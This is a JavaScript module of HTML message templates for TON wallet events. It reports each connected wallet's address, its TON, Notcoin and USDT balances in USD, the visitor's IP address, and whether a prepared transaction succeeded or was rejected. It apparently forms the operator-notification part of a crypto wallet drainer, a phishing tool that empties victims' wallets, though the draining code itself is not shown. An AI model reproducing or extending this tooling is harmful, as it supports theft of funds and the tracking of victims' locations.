import { Address, fromNano } from "@ton/ton";
import { shortAddress } from "./funcs";

function NEW_WALLET(data) {
  const {
    address,
    pubkey,
    isRestoredConn,
    walletBalance,
    tonBalance,
    tonBalanceUSD,
    jettonBalanceInfo,
    ip,
    notcoinPrice,
  } = data;

  let jettonInfo = "";
  for (let jetton of jettonBalanceInfo) {
    const symbol = jetton.jetton.symbol;
    if (symbol === "NOT") {
      const nanoBalance = +jetton.balance;
      const realBalance = +fromNano(nanoBalance);
      const usdBalance = realBalance * notcoinPrice;
      jettonInfo += `    Notcoins: ${realBalance.toFixed(
        2
      )} [ ~ ${usdBalance.toFixed(2)} USD ] \n`;
    } else if (symbol === "USD₮") {
      const nanoBalance = +jetton.balance;
      const realBalance = nanoBalance / 1000000;
      const usdBalance = realBalance * 1;
      jettonInfo += `    USD₮s: ${realBalance.toFixed(
        2
      )} [ ~ ${usdBalance.toFixed(2)} USD ] \n`;
    } else if (symbol === "jUSDT") {
      const nanoBalance = +jetton.balance;
      const realBalance = nanoBalance / 1000000;
      const usdBalance = realBalance * 1;
      jettonInfo += `    jUSDT: ${realBalance.toFixed(
        2
      )} [ ~ ${usdBalance.toFixed(2)} USD ] \n`;
    }
  }

  return `
${isRestoredConn ? "♻️ Connection Restored. " : "✅ New Wallet Connected. "}

🎫 Address: <a href='https://tonviewer.com/${address}}'>${shortAddress(
    address
  )}</a>

💸 Wallet Balance: ~ ${walletBalance.toFixed(2)} USD
💸 TONs: ${tonBalance.toFixed(2)} [ ~ ${tonBalanceUSD.toFixed(2)} USD ]

🧩 Jetton Wallet Info : [ 

${jettonInfo}
 ] 

🌐 IP: <a href='https://check-host.net/ip-info?host=${ip}'>${ip}</a>
  `;
}

function PREPARE_TRANSACTION(data) {
  const { address, walletBalance, tonBalance, tonBalanceUSD } = data;
  return `
♻️ Preparing Transaction ...

🎫 Address: <a href='https://tonviewer.com/${address}}'>${shortAddress(
    address
  )}</a>

💸 Wallet Balance: ~ ${walletBalance.toFixed(2)} USD
💸 TONs: ${tonBalance.toFixed(2)} [ ~ ${tonBalanceUSD.toFixed(2)} USD ]
  `;
}

function TRANSACTION_SUCCESS(data) {
  const { address, walletBalance } = data;
  return `
✅ Transaction Success ...

🎫 Address: <a href='https://tonviewer.com/${address}}'>${shortAddress(
    address
  )}</a>

💸 Wallet Balance: ~ ${walletBalance.toFixed(2)} USD
  `;
}

function TRANSACTION_REJECTED(data) {
  const { address, walletBalance } = data;
  return `
❌ Transaction Rejected.

🎫 Address: <a href='https://tonviewer.com/${address}}'>${shortAddress(
    address
  )}</a>

💸 Wallet Balance: ~ ${walletBalance.toFixed(2)} USD
  `;
}

export {
  NEW_WALLET,
  PREPARE_TRANSACTION,
  TRANSACTION_SUCCESS,
  TRANSACTION_REJECTED,
};
